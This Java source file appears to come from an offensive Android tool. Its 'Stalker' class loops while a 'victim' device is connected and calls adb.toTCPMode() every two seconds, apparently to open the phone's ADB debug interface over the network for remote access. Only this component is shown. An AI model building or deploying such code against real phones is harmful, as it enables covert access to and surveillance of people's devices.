package core;

public class Stalker implements Runnable{
	
	private Adb adb;
	String deviceID;
	boolean victimConnected;
	
	public Stalker(String deviceID)
	{
		this.deviceID = deviceID;
		adb = new Adb(deviceID);
	}


	@Override
	public void run() {
		while (true)
		{
			isVictimConnected();
			if (!victimConnected)
			{
				return;
			}
			System.out.println("Stalking " + adb.deviceID + "...");
			adb.toTCPMode();
			wait(2000);
		}
	}
	
	public void start()
	{
		new Thread(this).start();
	}
	
	public void isVictimConnected()
	{
		victimConnected = DeviceMonitor.currentDevices.contains(deviceID);
	}
	
	private void wait(int milliseconds)
	{
		try
		{
			Thread.sleep(milliseconds);
		}
		catch (Exception e)
		{
			e.printStackTrace();
		}
	}

}
